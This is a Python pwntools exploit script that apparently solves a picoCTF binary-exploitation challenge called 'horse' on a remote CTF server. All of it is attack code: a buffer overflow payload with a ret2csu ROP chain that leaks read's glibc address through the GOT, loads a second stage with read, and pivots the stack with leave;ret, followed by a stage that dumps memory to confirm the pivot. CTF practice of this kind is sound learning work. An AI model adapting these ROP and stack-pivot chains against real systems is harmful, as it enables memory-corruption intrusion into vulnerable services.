from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'error'

r = remote('mars.picoctf.net', 31809)
elf = ELF('./horse')
got_read = elf.got['read']
got_write = elf.got['write']

csu_pop = 0x400bfa 
csu_call = 0x400be0
leave_ret = 0x400b96 

def leak_read():
    heap_stack = 0x602020 
    payload = b'A' * 32
    payload += b'B' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_read) + p64(8)
    payload += p64(csu_call)
    payload += b'J' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_read) + p64(0) + p64(heap_stack) + p64(0x500)
    payload += p64(csu_call)
    payload += b'J' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(heap_stack) + p64(0) * 4 + p64(leave_ret) 

    r.sendline(payload)
    r.recvuntil(b'/     /   \xc2\xb4\n')
    try:
        leaked_data = r.recvn(8)
        leaked_read = u64(leaked_data)
        print(f"Leaked read@GLIBC: {hex(leaked_read)}")
        return leaked_read
    except:
        exit()

leaked_read = leak_read()

# Stage 2: Verify Pivot using ret2csu (no gadgets needed)
# write(1, 0x400000, 0x100)
payload2 = b'J' * 8 
payload2 += p64(csu_pop) 
payload2 += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(0x400000) + p64(0x100)
payload2 += p64(csu_call)
payload2 += b'J' * 8 
payload2 += p64(csu_pop)
payload2 += p64(0) * 6
payload2 += p64(0xdeadbeef)

print("Sending Stage 2 (Verify Pivot)...")
time.sleep(0.5)
r.sendline(payload2)

try:
    dump = r.recvn(0x100)
    print("Pivot SUCCESS! Received dump.")
    print(hexdump(dump[:32]))
except:
    print("Pivot FAILED.")

r.close()
